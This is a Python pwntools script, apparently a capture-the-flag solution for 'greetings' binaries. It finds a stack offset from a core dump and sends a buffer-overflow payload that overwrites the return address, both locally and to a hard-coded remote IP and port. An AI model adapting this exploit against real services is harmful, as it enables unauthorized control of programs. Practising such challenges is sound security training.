#!/usr/bin/env python3

"""
references
- https://0xrick.github.io/binary-exploitation/bof3/
- https://0xrick.github.io/binary-exploitation/bof4/
- https://medium.com/@two06/solving-a-simple-buffer-overflow-with-pwntools-575a37e4ddb1
- https://docs.pwntools.com/en/stable/elf/corefile.html
- https://samsclass.info/127/proj/ED402.htm
"""

from pwn import *
import IPython
import time

def offset():
    io = process('./greetings_again')
    print(io.recvline())
    print(io.recvline())
    print(io.recvline())
    print(io.recvline())
    print(io.recvline())
    io.sendline(cyclic(500))
    io.wait()
    core = io.corefile
    #IPython.embed()
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    rsp_offset = cyclic_find(pattern)
    info("rsp offset is %d", rsp_offset)
    
"""
[*] Process './greetings_again' stopped with exit code -11 (SIGSEGV) (pid 52126)
[+] Parsing corefile...: Done
[*] '/home/user/git/dbh-2022/pwn_greetings_again/core.52126'
    Arch:      amd64-64-little
    RIP:       0x559af92d1253
    RSP:       0x7fff960715d8
    Exe:       '/home/user/git/dbh-2022/pwn_greetings_again/greetings_again' (0x559af92d0000)
    Fault:     0x6361616663616165
[*] rsp = 0x7fff960715d8
[*] rsp offset is 216
"""

def pwn():
    io = process('./greetings')
    print(io.recvregex(b':'))
    payload = b'A'*72 + b'\xd2\x11@\x00\x00\x00\x00\x00'
    io.sendline(payload)
    print(io.recvline())
    print(io.recvline())
    print(io.recvline())
    print(io.recvline())

def pwn_remote(ip='20.126.227.19', port='57005'):
    io = pwnlib.tubes.remote.remote(ip, port)
    print(io.recvregex(b':'))
    payload = b'A'*72 + b'\xd2\x11@\x00\x00\x00\x00\x00'
    io.sendline(payload)
    time.sleep(1)
    print(io.recvregex(b'}'))

offset()
#pwn()
#pwn_remote()